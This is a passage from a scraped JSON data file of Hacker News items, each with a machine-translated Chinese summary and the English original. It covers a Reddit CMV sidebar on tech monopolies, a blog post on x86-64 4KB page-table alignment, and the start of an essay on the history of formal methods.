FTF\u662f\u4e00\u79cd\u8bd5\u56fe\u51cf\u5c11\u4e3b\u9898\u75b2\u52b3\u3002\n     \u4efb\u4f55\u539f\u5219\u4e0a\u7684\u4efb\u4f55\u5e16\u5b50\u90fd\u662f\u5728\u8fc7\u53bb24\u5c0f\u65f6\u5185\u53d1\u5e03\u7684\u5e16\u5b50\uff0c\u5c06\u88ab\u5220\u9664\u4ee5\u51cf\u5c11\u4e3b\u9898\u75b2\u52b3\u3002 \n\u6211\u4eec\u5df2\u7ecf\u7f16\u5236\u4e86\u8bb8\u591a\u6709\u7528\u7684\u4fe1\u606f\uff0c\u4f8b\u5982\u5bf9\u6211\u4eec\u7684\u89c4\u5219\uff0cCMV\u793c\u4eea\uff0c\u6863\u6848\uff0cCMV\u7684\u7814\u7a76\u8bba\u6587\u7684\u5b8c\u6574\u89e3\u91ca\uff0c\u4ee5\u53ca\u5173\u4e8e\u6211\u4eec\u7ef4\u57fa\u524a\u5f31\u7684\u4e00\u4e9b\u66f4\u591a\u7684\u4e00\u822c\u4fe1\u606f\u3002  \u5bf9\u4e8e\u5bf9\u6211\u4eec\u5982\u4f55\u8fdb\u884c\u8c03\u5ea6\u8fd9\u4e00\u6b3a\u9a97\u6587\u4ef6\u611f\u5174\u8da3\u7684\u4eba\uff0c\u6211\u4eec\u5728\u6211\u4eec\u7684Mod\u6807\u51c6\u9875\u9762\u4e0a\u63d0\u4f9b\u4e86\u6211\u4eec\u7684\u65b9\u6cd5\u3002 ", "note_en": "join leave  1,319,727  readers  A place to post an opinion you accept may be flawed, in an effort to understand other perspectives on the issue. Enter with a mindset for conversation, not debate.   More Detail\n  Explain the  reasoning behind your view, not just what that view is (500+  characters required). \u25be\n Note: if your view is about a &#34;double standard&#34;, please see the  guidelines here. [ More]\n You must personally hold the view and demonstrate that you are open to it changing.\u25be\n A post cannot be made on behalf of others, for playing devil&#39;s advocate, as any entity other than yourself, or to &#34;soapbox&#34;. Posts by throwaway accounts must be approved through  modmail. [ More]\n Submission titles must adequately sum up your view and include &#34;CMV:&#34; at the beginning. \u25be\n Posts cannot express a neutral stance, suggest harm against a specific person, be self-promotional, or discuss this subreddit (visit  r/ideasforcmv instead). \u25be\n No view is banned from CMV based on popularity or perceived offensiveness, but the above types of post are disallowed for practical reasons. [ More]\n Only post if you are willing to have a conversation with those who reply to you, and are available to  start doing so  within 3 hours of posting. \u25be\n  Direct responses to a CMV post must challenge at least one aspect of OP\u2019s stated view (however minor), or ask a clarifying question. \u25be\n Arguments in favor of the view OP is willing to change must be restricted to replies to other comments. [ More]\n Your comment will be removed even if the rest of it is solid. &#39;They started it&#39; is not an excuse. You should report, not retaliate. [ More]\n Refrain from accusing OP or anyone else of being unwilling to change their view, or of arguing in bad faith. \u25be\n If you are unsure whether someone is genuine, ask clarifying questions (see:  socratic method). If you think they are still exhibiting poor behaviour, please  message us. [ More]\n Award a  delta if you&#39;ve acknowledged a change in your view. Do not use deltas for any other purpose. \u25be\n You must include an explanation of the change along with the delta so we know it&#39;s genuine. Delta abuse includes sarcastic deltas, joke deltas, super-upvote deltas, etc. [ More]\n Comments that are only links, jokes, or &#34;written upvotes&#34; will be removed. Humor and affirmations of agreement can be contained within more substantial comments. [ More]\n  Whether you&#39;re the OP or not, please reply to the user(s) that change your view to  any degree with a delta in your comment (instructions below), and also include an explanation of the change.   Full details.\n   /u/DeltaBot will maintain delta counts in user flair, wiki pages for each user&#39;s delta history, record deltas in  /r/DeltaLog, and update  deltaboards where necessary.\n       On Fridays, posts can&#39;t be highly similar to any other in the past month, and won&#39;t show up in the new queue until they&#39;ve been checked and approved by a moderator. FTF is an attempt to reduce topic fatigue.\n     Any post that is  identical in principle to a post made in the last 24 hours will be removed to reduce topic fatigue.\n   We have compiled lots of useful information such as full explanations of our rules, CMV etiquette, archives, research papers on CMV, and some more general information about the subreddit   in our wiki.\n For anyone interested in how we moderate this subreddit, we have our approach laid out over at our   mod standards page.", "posttime": "2021-06-22 16:44:24", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "\u79d1\u6280,tech,\u89c6\u56fe", "title": "CMV\uff1a\u79d1\u6280\u5784\u65ad\u5e94\u8be5\u88ab\u7981\u6b62\u4e3a\u73ed\u7ea7 ", "title_en": "CMV: Tech monopolies should be banned as a class", "transed": 1, "url": "https://old.reddit.com/r/changemyview/comments/o5g0wq/cmv_tech_monopolies_should_be_banned_as_a_class/", "via": "", "real_tags": ["\u79d1\u6280", "tech", "\u89c6\u56fe"]}, {"category": "", "categoryclass": "", "imagename": "1884f8fb9738c71dd30e341464e483f9.png", "infoid": 1067394, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u6211\u4e22\u5931\u4e863\u5468\u7684\u6211\u7684\u751f\u547d\uff0c\u8bd5\u56fe\u5728\u82f1\u7279\u5c14X86-64 / AMD64\u624b\u518c\u4e0a\u5305\u88c5\u6211\u7684\u5934\uff0c\u4ee5\u5c1d\u8bd5\u4e3a\u6211\u7684\u7231\u597d\u8005\u64cd\u4f5c4-KBETE\u9875\u9762\u7ffb\u8bd1\u3002\u8fd9\u4e2a\u5c0f\u535a\u5ba2\u6587\u7ae0\u7684\u76ee\u7684\u662f\u8bb0\u5f55\u624b\u518c\u4e2d\u7684\u4e00\u4e9b\u4e1c\u897f\u5e76\u4e0d\u6e05\u695a\u3002 \uff08\u7279\u522b\u662f\u65b0\u4eba\uff09\n   \u60a8\u5df2\u7ecf\u770b\u5230\u4e86\u5927\u7ea6\u5341\u4ebf\u6b21\u7684\u7167\u7247\uff0c\u5982\u679c\u60a8\u6b63\u5728\u9605\u8bfb\u6b64\u5e16\uff0c\u60a8\u77e5\u9053\u60a8\u9700\u8981\u5728\u5185\u5b58\u4e2d\u521b\u5efa\u8fd9\u4e9b\u9875\u9762\u8868\uff0c\u4ee5\u4fbf\u786c\u4ef6\u4e0e\u64cd\u4f5c\u7cfb\u7edf\u5efa\u7acb\u4e00\u4e2a\u660e\u786e\u5b9a\u4e49\u7684\u63a5\u53e3\uff0c\u4ee5\u4fbf\u5728\u79fb\u52a8\u523064\u4e4b\u524d\u5206\u914d\u5c0f\u5757\u7684\u5c0f\u5757-bit\u6a21\u5f0f\u3002\n    \u5728\u5f15\u5bfc\u8fc7\u7a0b\u7684\u65e9\u671f\u9636\u6bb5\u671f\u95f4\uff0c\u6211\u60f3\u8981\u4e3a\u524d10MB\u5185\u5b58\u521b\u5efaIdentity\u6620\u5c04\u9875\u9762\u7684\u56fe\u50cf\u3002\u5728\u79fb\u52a8\u5230\u957f\u6a21\u5f0f\uff0864\u4f4d\uff09\u4e4b\u524d\uff0c\u8fd9\u5c06\u662f\u5728\u5185\u5b58\u5b58\u50a8\u5668\u4e2d\u52a0\u8f7d\u5185\u6838\u7684\u6709\u7528\u3002\n         \u5bf9\u6211\u4eec\u4e3a\u4ec0\u4e48\u8fd9\u6837\u505a\u7684\u89e3\u91ca\u662f\u7531\u4e8e\u9884\u671f\u76844-Kbyte PDE\u6761\u76ee\u683c\u5f0f\n    \u4f46\u5982\u679c\u4f60\u4ed4\u7ec6\u770b\uff0c\u4f60\u4f1a\u53d1\u73b0\u4e00\u4e9b\u975e\u5e38\u5947\u602a\u7684\u4e1c\u897f\u3002\u6211\u4eec\u88ab\u5bfc\u81f4\u8ba4\u4e3a\u9875\u9762\u8868\u57fa\u5730\u5730\u5740\uff080x13000\uff09\u5e94\u6839\u636e\u4e0a\u56fe\u7684\u56fe\u7247\u5728\u6bd4\u727951:12\u4e4b\u95f4\u8bbe\u7f6e\u3002\n \u5982\u679c\u8be5\u5047\u8bbe\u662f\u6b63\u786e\u7684\uff0c\u52190x13000\u5e94\u5de6\u79fb12\u4f4d\u5e76\u53d8\u4e3a0x13000000\u3002\u56e0\u6b64\uff0c\u5728\u8bbe\u7f6e\u9875\u9762\u6807\u5fd7\u4e4b\u540e\uff0c\u5b83\u5c06\u53d8\u4e3a0x13000003\u3002\u8fd9\u610f\u5473\u7740\u60a8\u4e4b\u524d\u5171\u4eab\u7684\u4ee3\u7801\u7247\u6bb5\u662f\u9519\u8bef\u7684\uff0c\u662f\u5bf9\u7684\u5417\uff1f\n \u5982\u679c\u4f60\u60f3\u82b13\u5468\u8bd5\u56fe\u5f04\u6e05\u695a\u4f60\u4e3a\u4ec0\u4e48\u6ca1\u6709\u542f\u52a8\u7684\u65f6\u5019\uff0c\u90a3\u4e48\u5728\u8d28\u7591\u4f60\u7684\u60c5\u51b5\u4e0b\u4f60\u7684\u6bcf\u4e00\u804c\u4e1a\u51b3\u5b9a\u90fd\u6ca1\u6709\u542f\u52a8 \n\u601d\u60f3\u7684\u706b\u8f66\u4e0d\u662f\u9519\u8bef\u7684\uff0c\u4f46X86-64\u8bbe\u8ba1\u6709\u70b9\u4e0d\u540c\u4e8e\u6211\u4eec\u63a8\u6d4b\u7684\u4e1c\u897f\u3002\n \u9875\u9762\u6570\u636e\u7ed3\u6784\u8868\u59cb\u7ec8\u57284-kbyte\u8fb9\u754c\u4e0a\u5bf9\u9f50\uff0c\u56e0\u6b64\u53ea\u6709\u4e0a\u8ff0\u4f4d11\u7684\u5730\u5740\u4f4d\u5b58\u50a8\u5728\u7ffb\u8bd1\u8868\u57fa\u5730\u5740\u5b57\u6bb5\u4e2d\u3002\u5047\u8bbe\u4f4d11\uff1a0\u4e3a0.\uff08\u53d6\u81eaAMD64\u624b\u518c\uff0c\u7b2c150\u9875\uff09\n \u8fd9\u610f\u5473\u7740\u5728\u5b9e\u8df5\u4e2d\u662f\u4ec0\u4e48\uff0c\u5982\u679c\u6211\u4eec\u7684\u9875\u9762\u5728\u5730\u57400x13000\u4e0a\uff0c\u6807\u5fd7\u4f4d\u662f0x03 = 0x13003\uff0c\u6211\u4eec\u7684\u786c\u4ef6\u201c\u91cd\u65b0\u5229\u7528\u201d12\u4f4d\u4ee5\u5728\u5f53\u524d\u9875\u9762\u5730\u5740\u6dfb\u52a00x1000\u65f6\u8bbe\u7f6e\u6807\u5fd7\uff0c\u5b83\u53ef\u4ee5\u5230\u8fbe\u4e0b\u4e00\u9875\u3002\u5982\u679c\u5355\u72ec\u7684\u662f\u5355\u72ec\u7684\uff0c\u8fd9\u662f\u96be\u4ee5\u63a8\u6d4b\u7684\u662fPage Tables\u662f4096\u5b57\u8282\u7684\u6574\u4e2a\u539f\u56e0\uff08\u62160x1000\ud83d\ude1c\uff09\n \u95ee\u9898\u662f\uff0c\u867d\u7136\u8fd9\u662f\u5728\u624b\u518c\u4e2d\u7f16\u5199\u7684\uff0c\u4f46\u6ca1\u6709\u5f3a\u8c03\u5728\u4e00\u4e2a\u624b\u518c\u4e2d\u95f4\u7684\u7a00\u758f\u53e5\u5b50\uff0c\u5343\u9875\ud83d\ude2b\n \u597d\u5427\uff0c\u6211\u82b1\u4e86\u5f88\u957f\u65f6\u95f4\u624d\u80fd\u8fbe\u5230\u8fd9\u4e2a\uff0c\u6211\u76f8\u4fe1\u4e00\u5929\u6211\u4f1a\u5fd8\u8bb0\u6211\u7684\u540d\u5b57\uff0c\u4f46\u4e0d\u4f1a\u5fd8\u8bb0\u8fd9\u573a\u4e0ex86-64\u5206\u9875\u7684\u6218\u6597\u3002\n \u6211\u5e0c\u671b\u5982\u679c\u6709\u4eba\u5728\u52aa\u529b\u4e0e\u6211\u53ef\u4ee5\u51cf\u5c11\u90a3\u4e2a\u65f6\u95f4\u7684\u540c\u6837\u7684\u95ee\u9898\uff0c\u90a3\u5c31\u82b1\u4e86\u4f60\u6765\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u3002 \u2764\ufe0f ", "note_en": "I lost 3 weeks of my life trying to wrap my head around the Intel x86\u201364/AMD64 manuals to try implementing 4-Kbyte Page translation for my  hobbyist OS. The purpose of this small blog post is to document some of the things that in the manual aren\u2019t clear at all. (especially for newcomers)\n   You have seen that picture a billion times and i  f you are reading this post you know that you need to create these Page Tables in memory so that the hardware establishes a well-defined interface with the OS for allocating small chunks of memory before moving to 64-bit mode.\n    Image that I want to create identity-mapped pages for the first 10MB of memory during the early stages of the boot process. This will be useful for loading the kernel in memory memory before moving to Long mode (64-bit).\n         The explanation to why we do that is due to the expected 4-Kbyte PDE entry format\n    But if you look closely, you will find something very very odd. We are led to believe that the Page-Table Base Address (0x13000) should be set between the bits 51:12 as per the picture above.\n If that assumption is correct, then 0x13000 should be left shifted 12 bits and become 0x13000000. So after the setting the page flags it would become effectively 0x13000003. Which means that the code snippet you shared before is wrong, is that right?\n Think like that if you want to spend 3 weeks trying to figure out why you OS doesn\u2019t boot while questioning every career decision you\u2019ve made in the meantime \ud83d\ude30\n The train of thought isn\u2019t wrong per se, but the x86\u201364 design works a bit different from what we speculated.\n Page data- structure tables are  always aligned on 4-Kbyte boundaries, so only the  address bits above bit 11 are stored in the translation-table base-address field. Bits 11:0 are assumed to be 0. (Taken from the AMD64 manual, page 150)\n What this means in practice is that if our page is on address 0x13000 and flag bits are 0x03 = 0x13003, our hardware \u2018re-utilises\u2019 the 12-bits to set the flags while it knows that if it adds 0x1000 to the current page address, it can get to the next page. It\u2019s hard not to speculate if that alone isn\u2019t the whole reason why page tables are 4096 bytes aligned (or 0x1000 \ud83d\ude1c)\n The problem is that although this is written in the manual, no emphasis is really given to this sparse sentence in a middle of a manual with thousands of pages \ud83d\ude2b\n Well, it took me a long time to get to this and I\u2019m sure that I will forget my name one day but won\u2019t forget this battle with x86\u201364 paging implementation.\n I hope that if someone is struggling with the same problem that I could have reduced that time it took you to figure this out. \u2764\ufe0f", "posttime": "2021-06-22 16:43:33", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "\u8bbe\u8ba1,page,\u9875\u9762", "title": "x86-64 4kb page\u7ffb\u8bd1\u8bbe\u8ba1\uff1a\u8fd9\u662f\u8fd9\u4e2a\u539f\u56e0\u4e3a4096\u5b57\u8282\u5bf9\u9f50\u7684\u539f\u56e0\uff1f ", "title_en": "x86\u201364 4Kb Page translation design: is this why pages are 4096 bytes aligned?", "transed": 1, "url": "https://deepdives.medium.com/x86-64-4kbyte-page-translation-design-is-this-the-reason-why-pages-are-4096-bytes-aligned-19952a0a55f4", "via": "", "real_tags": ["\u8bbe\u8ba1", "page", "\u9875\u9762"]}, {"category": "", "categoryclass": "", "imagename": "", "infoid": 1067393, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u6211\u5728\u8f6f\u4ef6\u5de5\u7a0b\u6808\u4ea4\u6362\u4e2d\u770b\u5230\u4e86\u8fd9\u4e2a\u95ee\u9898\uff1a\u9632\u6b62\u5e7f\u6cdb\u91c7\u7528\u6b63\u5f0f\u65b9\u6cd5\u7684\u969c\u788d\u662f\u4ec0\u4e48\uff1f\u8fd9\u4e2a\u95ee\u9898\u88ab\u5173\u62bc\u4e3a\u57fa\u4e8e\u610f\u89c1\uff0c\u5927\u90e8\u5206\u7b54\u6848\u90fd\u662f\u201c\u592a\u8d35!!!\u201d\u7684\u4e1c\u897f\u3002\u6216\u201c\u7f51\u7ad9\u4e0d\u662f\u98de\u673a!!!\u201d\u8fd9\u4e9b\u90fd\u662f\u771f\u7684\uff0c\u4f46\u4e0d\u8981\u975e\u5e38\u89e3\u91ca\u3002\u6211\u5199\u4e86\u8fd9\u4e00\u70b9\uff0c\u63d0\u4f9b\u4e86\u4e00\u4e2a\u8f83\u5927\u7684\u5f62\u5f0f\u65b9\u6cd5\u7684\u5386\u53f2\u56fe\u7247\uff0c\u4e3a\u4ec0\u4e48\u4ed6\u4eec\u5b9e\u9645\u4e0a\u662f\u5982\u6b64\u672a\u4f7f\u7528\uff0c\u4ee5\u53ca\u6211\u4eec\u6b63\u5728\u505a\u7684\u4e8b\u60c5\u8ba9\u4ed6\u4eec\u4f7f\u7528\u3002\n \u5728\u6211\u4eec\u5f00\u59cb\u4e4b\u524d\uff0c\u6211\u4eec\u9700\u8981\u653e\u4e0b\u4e00\u4e9b\u6761\u6b3e\u3002\u771f\u7684\u4e0d\u662f\u4e00\u4e2a\u6b63\u5f0f\u7684\u65b9\u6cd5\u793e\u533a\uff0c\u8fd9\u662f\u4e00\u4e2a\u5728\u8349\u539f\u4e0a\u89c5\u98df\u7684\u51e0\u4e2a\u5c0f\u4e50\u961f\u3002\u8fd9\u610f\u5473\u7740\u4e0d\u540c\u7684\u7fa4\u4f53\u4ee5\u4e0d\u540c\u65b9\u5f0f\u4f7f\u7528\u672f\u8bed\u3002\u975e\u5e38\u5e7f\u6cdb\u5730\uff0cFM\u6709\u4e24\u4e2a\u57df\uff1a\u6b63\u5f0f\u89c4\u683c\u662f\u7814\u7a76\u6211\u4eec\u5982\u4f55\u7f16\u5199\u7cbe\u786e\uff0c\u660e\u786e\u7684\u89c4\u683c\uff0c\u6b63\u5f0f\u9a8c\u8bc1\u662f\u7814\u7a76\u5982\u4f55\u8bc1\u660e\u4e8b\u7269\u662f\u6b63\u786e\u7684\u3002\u4f46\u201c\u4e8b\u60c5\u201d\u5305\u62ec\u4ee3\u7801\u548c\u62bd\u8c61\u7cfb\u7edf\u3002\u6211\u4eec\u4e0d\u4ec5\u4f7f\u7528\u5355\u72ec\u7684\u624b\u6bb5\u6765\u6307\u5b9a\u8fd9\u4e24\u79cd\u4e1c\u897f\uff0c\u6211\u4eec\u7ecf\u5e38\u4f7f\u7528\u4e0d\u540c\u7684\u624b\u6bb5\u6765\u9a8c\u8bc1\u5b83\u4eec\u3002\u4e3a\u4e86\u4f7f\u4e8b\u60c5\u66f4\u52a0\u4ee4\u4eba\u56f0\u60d1\uff0c\u5982\u679c\u6709\u4eba\u8bf4\u8fc7\u6b63\u5f0f\u7684\u89c4\u8303\uff0c\u4ed6\u4eec\u901a\u5e38\u610f\u5473\u7740\u4ed6\u4eec\u90fd\u6307\u5b9a\u548c\u9a8c\u8bc1\u7cfb\u7edf\uff0c\u5982\u679c\u6709\u4eba\u8bf4\u4ed6\u4eec\u8fdb\u884c\u6b63\u5f0f\u9a8c\u8bc1\uff0c\u4ed6\u4eec\u901a\u5e38\u610f\u5473\u7740\u5b83\u4eec\u90fd\u610f\u5473\u7740\u5b83\u4eec\u90fd\u6307\u5b9a\u548c\u9a8c\u8bc1\u4ee3\u7801\u3002\n \u51fa\u4e8e\u6e05\u6670\u76ee\u7684\uff0c\u6211\u5c06\u9a8c\u8bc1\u9a8c\u8bc1\u5230\u4ee3\u7801\u9a8c\u8bc1\uff08CV\uff09\u548c\u8bbe\u8ba1\u9a8c\u8bc1\uff08DV\uff09\uff0c\u5e76\u5c06\u89c4\u8303\u4e0eCS\u548cDS\u7c7b\u4f3c\u3002\u8fd9\u4e9b\u4e0d\u662f\u66f4\u5e7f\u6cdb\u7684FM\u4e16\u754c\u4e2d\u4f7f\u7528\u7684\u672f\u8bed\u3002\u6211\u4eec\u9996\u5148\u8c08\u8bbaCS\u548cCV\uff0c\u7136\u540e\u7ee7\u7eed\u5230DS\u548cDV\u3002\n \u6b64\u5916\uff0c\u6211\u4eec\u53ef\u4ee5\u8fdb\u884c\u90e8\u5206\u9a8c\u8bc1\uff0c\u6211\u4eec\u53ea\u9a8c\u8bc1\u89c4\u8303\u7684\u5b50\u96c6\uff0c\u6216\u5b8c\u5168\u9a8c\u8bc1\uff0c\u6211\u4eec\u9a8c\u8bc1\u6574\u4e2a\u89c4\u8303\u3002\u8fd9\u53ef\u80fd\u662f\u8bc1\u660e\u201c\u5b83\u6c38\u8fdc\u4e0d\u4f1a\u5d29\u6e83\u6216\u63a5\u53d7\u9519\u8bef\u7684\u5bc6\u7801\u201d\u6216\u201c\u5982\u679c\u60a8\u7ed9\u51fa\u9519\u8bef\u7684\u5bc6\u7801\u4e09\u6b21\uff0c\u5b83\u6c38\u8fdc\u4e0d\u4f1a\u5d29\u6e83\u6216\u627f\u8ba4\u9519\u8bef\u7684\u5bc6\u7801\u5e76\u9501\u5b9a\u5e10\u6237\u3002\u201d\u5927\u591a\u6570\u6b64\u5386\u53f2\u5c06\u5047\u8bbe\u6211\u4eec\u6b63\u5728\u8fdb\u884c\u5168\u9762\u9a8c\u8bc1\u3002\n \u6211\u4eec\u8fd8\u5e94\u8be5\u6f84\u6e05\u6211\u4eec\u6b63\u5f0f\u7684\u8f6f\u4ef6\u7c7b\u578b\u3002\u5927\u591a\u6570\u4eba\u5c06\u8f6f\u4ef6\u5c40\u9762\u5730\u5206\u4e3a\u9ad8\u4fdd\u8bc1\u8f6f\u4ef6\uff0c\u4f8b\u5982\u533b\u7597\u8bbe\u5907\u548c\u98de\u673a\uff0c\u4ee5\u53ca\u5176\u4ed6\u4e00\u5207\u3002\u4eba\u4eec\u5047\u8bbe\u6b63\u5f0f\u7684\u65b9\u6cd5\u5e7f\u200b\u200b\u6cdb\u7528\u4e8e\u524d\u8005\u548c\u540e\u8005\u4e0d\u5fc5\u8981\u3002\u8fd9\u662f\uff0c\u5982\u679c\u6709\u7684\u8bdd\uff0c\u592a\u4e50\u89c2\uff1a\u5927\u591a\u6570\u4eba\u5728\u9ad8\u4fdd\u8bc1\u8f6f\u4ef6\u4e2d\u4e0d\u4f7f\u7528\u6b63\u5f0f\u65b9\u6cd5\u3002\u6211\u4eec\u5c06\u91cd\u70b9\u5173\u6ce8\u201c\u5e38\u89c4\u201d\u8f6f\u4ef6\u3002\n \u6700\u540e\uff0c\u4e00\u4f4d\u514d\u8d23\u58f0\u660e\uff1a\u6211\u4e0d\u662f\u5386\u53f2\u5b66\u5bb6\uff0c\u800c\u6211\u8bd5\u56fe\u505a\u5c3d\u804c\u8c03\u67e5\uff0c\u90a3\u4e48\u8fd9\u91cc\u53ef\u80fd\u4f1a\u6709\u9519\u8bef\u3002\u6b64\u5916\uff0c\u6211\u4e13\u6ce8\u4e8e\u5f62\u5f0f\u89c4\u8303\uff08DS\u548cDV\uff09\uff0c\u56e0\u6b64\u6211\u5bf9\u4ee3\u7801\u9a8c\u8bc1\u7684\u4efb\u4f55\u4e8b\u60c5\u90fd\u6709\u53ef\u80fd\u72af\u9519\u8bef\u3002\u5982\u679c\u4f60\u770b\u5230\u9519\u4e86\uff0c\u8bf7\u7ed9\u6211\u53d1\u7535\u5b50\u90ae\u4ef6\uff0c\u6211\u4f1a\u4fee\u590d\u5b83\u3002 2\n   \u5728\u6211\u4eec\u8bc1\u660e\u6211\u4eec\u7684\u4ee3\u7801\u662f\u6b63\u786e\u7684\u4e4b\u524d\uff0c\u6211\u4eec\u9700\u8981\u77e5\u9053\u4ec0\u4e48\u662f\u201c\u6b63\u786e\u201d\u3002\u8fd9\u610f\u5473\u7740\u5177\u6709\u67d0\u79cd\u5f62\u5f0f\u7684\u89c4\u8303\u6216\u89c4\u8303\uff0c\u7528\u4e8e\u4ee3\u7801\u5e94\u8be5\u505a\u4ec0\u4e48\uff0c\u6211\u4eec\u53ef\u4ee5\u660e\u786e\u5730\u8bf4\u660e\u7279\u5b9a\u8f93\u51fa\u662f\u5426\u9075\u5faa\u89c4\u8303\u3002\u53ea\u662f\u8bf4\u4e00\u4e2a\u5217\u8868\u662f\u201c\u6392\u5e8f\u201d\u5c1a\u4e0d\u6e05\u695a\uff1a\u6211\u4eec\u4e0d\u77e5\u9053\u6211\u4eec\u6b63\u5728\u6392\u5e8f\u662f\u4ec0\u4e48\uff0c\u6211\u4eec\u6b63\u5728\u4f7f\u7528\u4ec0\u4e48\u6807\u51c6\uff0c\u751a\u81f3\u662f\u6211\u4eec\u7684\u610f\u601d\u662f\u201c\u6392\u5e8f\u201d\u3002\u76f8\u53cd\uff0c\u6211\u4eec\u53ef\u80fd\u4f1a\u8bf4\u201c\u5982\u679c\u5bf9\u4e8e\u4efb\u4f55\u4e24\u4e2a\u7d22\u5f15I\u548cj\uff0c\u5219\u6309\u5347\u5e8f\u6392\u5e8f\uff0c\u5982\u679c\u6211\uff06l lt; j\uff0c\u7136\u540el [i]\uff06lt; l [j]\u201c\u3002 \n\u7b2c\u4e00\u4e2a\u662f\u4f5c\u4e3a\u72ec\u7acb\u4e8e\u4ee3\u7801\u7684\u8bed\u53e5\u7f16\u5199\u5b83\u4eec\u3002\u6211\u4eec\u4f1a\u5199\u4e0b\u6211\u4eec\u7684\u6392\u5e8f\u529f\u80fd\uff0c\u5e76\u5728\u5355\u72ec\u7684\u6587\u4ef6\u4e2d\u5199\u5b9a\u7406\u201c\u8fd9\u8fd4\u56de\u6392\u5e8f\u5217\u8868\u201d\u3002\u8fd9\u662f\u6700\u53e4\u8001\u7684\u89c4\u8303\u5f62\u5f0f\uff0c\u4ecd\u7136\u662fIsabelle\u548cACL2\u505a\u4e8b\u7684\u65b9\u5f0f\u3002 3.\n \u7b2c\u4e8c\u4e2a\u5d4c\u5165\u4ee3\u7801\u4e2d\u7684\u89c4\u683c\uff0c\u4ee5\u524d/\u540e\u7f6e\u6761\u4ef6\uff0c\u65ad\u8a00\u548c\u4e0d\u53d8\u6027\u7684\u5f62\u5f0f\u3002\u6211\u4eec\u53ef\u80fd\u4f1a\u5728\u201c\u8fd4\u56de\u503c\u662f\u4e00\u4e2a\u6392\u5e8f\u5217\u8868\u201d\u7684\u51fd\u6570\u4e0a\u6dfb\u52a0\u4e00\u4e2a\u540e\u671f\u4f4d\u7f6e\u3002\u57fa\u4e8e\u65ad\u8a00\u7684\u89c4\u683c\u6700\u521d\u662f\u6b63\u5f0f\u7684\uff0c\u56e0\u4e3aHOARE\u903b\u8f91\uff0c\u5e76\u4e8e20\u4e16\u7eaa70\u5e74\u4ee3\u521d\u671f\u9996\u6b21\u878d\u5165\u4e86\u4e00\u4e2a\u6b27\u51e0\u91cc\u5fb7\u7684\u7f16\u7a0b\u8bed\u8a00\u3002 4\u8fd9\u79cd\u98ce\u683c\u4e5f\u88ab\u5408\u540c\u79f0\u4e3a\u8bbe\u8ba1\uff0c\u662f\u6700\u53d7\u6b22\u8fce\u7684\u5de5\u4e1a\u9a8c\u8bc1\u5f62\u5f0f\u3002 5.\n \u6700\u540e\uff0c\u6211\u4eec\u6709\u578b\u7cfb\u7edf\u3002\u901a\u8fc7Curry-Howard\u5bf9\u5e94\uff0c\u4efb\u4f55\u6570\u5b66\u5b9a\u7406\u6216\u8bc1\u636e\u90fd\u53ef\u4ee5\u88ab\u7f16\u7801\u4e3a\u4f9d\u8d56\u7c7b\u578b\u3002\u6211\u4eec\u4f1a\u5b9a\u4e49\u201c\u6392\u5e8f\u5217\u8868\u201d\u7684\u7c7b\u578b\uff0c\u5e76\u58f0\u660e\u6211\u4eec\u7684\u51fd\u6570\u5177\u6709\u7c7b\u578b\u7b7e\u540d[int]  - \uff06gt;\u6392\u5e8f[int]\u3002\n \u60a8\u53ef\u4ee5\u770b\u5230\u6240\u6709\u8fd9\u4e9b\u6837\u5b50\u7684\u793a\u4f8b\uff0c\u8ba9\u6211\u4eec\u8bc1\u660eleftpad\u3002 HOL4\u548cIsabelle\u662f\u201c\u72ec\u7acb\u5b9a\u7406\u201d\u89c4\u8303\uff0c\u706b\u82b1\u548c\u5927\u592b\u7684\u826f\u597d\u793a\u4f8b\uff0cSpark\u548cDafny\u5177\u6709\u201c\u5d4c\u5165\u5f0f\u65ad\u8a00\u201d\u89c4\u683c\uff0cCoQ\u548cAgda\u5177\u6709\u201c\u4f9d\u8d56\u5f0f\u201d\u89c4\u683c\u3002 6.\n \u5982\u679c\u60a8\u772f\u7740\u773c\u775b\uff0c\u5b83\u770b\u8d77\u6765\u50cf\u8fd9\u4e09\u79cd\u5f62\u5f0f\u7684\u4ee3\u7801\u89c4\u8303\u6620\u5c04\u5230\u81ea\u52a8\u6b63\u786e\u6027\u7684\u4e09\u4e2a\u4e3b\u57df\u540d\u68c0\u67e5\uff1a\u6d4b\u8bd5\uff0c\u5408\u540c\u548c\u7c7b\u578b\u3002\u8fd9\u4e0d\u662f\u5de7\u5408\u3002\u6b63\u786e\u6027\u662f\u9891\u8c31\uff0c\u6b63\u5f0f\u9a8c\u8bc1\u662f\u8be5\u9891\u8c31\u7684\u4e00\u4e2a\u6781\u7aef\u3002\u5f53\u6211\u4eec\u51cf\u5c11\u6211\u4eec\u9a8c\u8bc1\u7684\u4e25\u683c\uff08\u548c\u52aa\u529b\uff09\u65f6\uff0c\u6211\u4eec\u4f1a\u83b7\u5f97\u66f4\u7b80\u5355\u548c\u66f4\u7a84\u7684\u68c0\u67e5\uff0c\u65e0\u8bba\u662f\u5426\u4f7f\u7528\u8f83\u5f31\u7684\u7c7b\u578b\u9650\u5236\u63a2\u7d22\u7684\u72b6\u6001\u7a7a\u95f4\uff0c\u6216\u5411\u8fd0\u884c\u65f6\u63a8\u52a8\u9a8c\u8bc1\u3002\u7136\u540e\uff0c\u4efb\u4f55\u603b\u89c4\u683c\u7684\u65b9\u6cd5\u90fd\u6210\u4e3a\u90e8\u5206\u89c4\u8303\u7684\u624b\u6bb5\uff0c\u53cd\u4e4b\u4ea6\u7136\uff1a\u8bb8\u591a\u4eba\u8ba4\u4e3a\u6d01\u51c0\u5ba4\u662f\u4e00\u79cd\u6b63\u5f0f\u7684\u9a8c\u8bc1\u6280\u672f\uff0c\u4e3b\u8981\u901a\u8fc7\u63a8\u52a8\u4ee3\u7801\u68c0\u67e5\u8fdc\u8fdc\u8d85\u51fa\u4eba\u7c7b\u53ef\u80fd\u7684\u4ee3\u7801\u3002\n  